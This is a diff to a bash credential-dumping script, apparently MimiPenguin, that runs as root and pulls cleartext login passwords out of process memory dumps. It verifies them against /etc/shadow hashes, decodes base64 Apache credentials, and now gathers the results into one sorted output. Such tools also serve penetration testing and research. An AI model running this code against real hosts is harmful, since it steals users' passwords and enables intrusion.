@@ -12,14 +12,18 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 
+#Store results to cleanup later
+export RESULTS=""
+
 parse_pass ()
 {
+#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
+
 #If hash not in dump get shadow hashes
 if [[ ! $2 ]]; then
         SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
 fi
 
-#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
 #Determine password potential for each word
 while read -r line; do
 	#If hash in dump, prepare crypt line
@@ -32,7 +36,7 @@ while read -r line; do
 		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $2 ]]; then
 			#Find which user's password it is (useful if used more than once!)
 			USER="$(cat /etc/shadow | grep ${2} | cut -d':' -f 1)"
-			echo "$4			$USER:$line"
+			export RESULTS="$RESULTS$4			$USER:$line\n"
 		fi
 	#Else use shadow hashes
 	elif [[ $SHADOWHASHES ]]; then
@@ -45,39 +49,39 @@ while read -r line; do
 			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
 				#Find which user's password it is (useful if used more than once!)
 				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
-				echo "$4			$USER:$line"
+				export RESULTS="$RESULTS$4			$USER:$line\n"
 			fi
 		done <<< "$SHADOWHASHES"
 	#if no hash data - revert to checking probability
 	else
 		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ ^LOGNAME= ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ UTF\-8 ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ Manager\.Worker ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ \/usr\/share ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ \/bin ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ \.so\.[0-1]$ ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ x86_64 ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ (aoao) ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		elif [[ $line =~ stuv ]]; then
-			echo "[LOW]$4			$line"
+			export RESULTS="$RESULTS[LOW]$4			$line\n"
 		else
-			echo "[HIGH]$4			$line"
+			export RESULTS="$RESULTS[HIGH]$4			$line\n"
 		fi
 	fi
 done <<< "$1"
@@ -151,7 +155,7 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
                 while read -r encoded; do
 			CREDS="$(echo $encoded | base64 -d)"
 			if [[ $CREDS ]]; then
-				echo "$SOURCE			$CREDS"
+				export RESULTS="$RESULTS$SOURCE			$CREDS\n"
 			fi
 		done <<< "$DUMP"
                 
@@ -161,3 +165,7 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 	fi
 fi
 
+#Output results to STDOUT
+printf "MimiPenguin Results:\n"
+printf "$RESULTS" | sort -u
+unset RESULTS
